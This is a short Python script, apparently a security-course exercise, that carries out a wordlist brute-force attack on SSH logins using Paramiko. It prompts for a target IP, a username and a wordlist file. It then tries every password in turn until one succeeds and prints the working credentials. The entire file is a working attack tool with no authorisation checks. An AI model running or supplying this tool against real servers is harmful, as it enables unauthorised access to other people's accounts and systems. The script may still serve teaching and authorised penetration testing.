#!/usr/bin/env python3
# Script Name:                  Brute Force Wordlist attack tool (Paramiko)
# Author:                       Eduardo Ayala
# Date of latest revision:      08/01/23
# Purpose:                      Automated Brute Force attack (wordlist)

#Import Libraries
import time
import paramiko

def ssh_brute_force(ip_address, username, word_list_path):

    try:
        with open(word_list_path, 'r') as file:
            for password in file:
                password = password.strip()
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(hostname=ip_address, username=username, password=password)
                    print(f"Login successful! Username: {username}, Password: {password}")
                    ssh_client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed: Username: {username}, Password: {password}")
                except paramiko.SSHException as e:
                    print(f"SSH Error: {e}")
                except Exception as e:
                    print(f"Error: {e}")

                time.sleep(1)  # Delay between each attempt (adjust as needed)

    except FileNotFoundError:
        print("Word list file not found.")

# Main Function
def main():
    print("SSH Brute Force Tool")
# Prompts the user for SSH server IP, username, and word list file path.
    ip_address = input("Enter the IP address of the SSH server: ")
    username = input("Enter the SSH username: ")
    word_list_path = input("Enter the word list file path: ")

# Calls the ssh_brute_force function to attempt each word in the word list for SSH authentication.
    ssh_brute_force(ip_address, username, word_list_path)

if __name__ == "__main__":
    main()
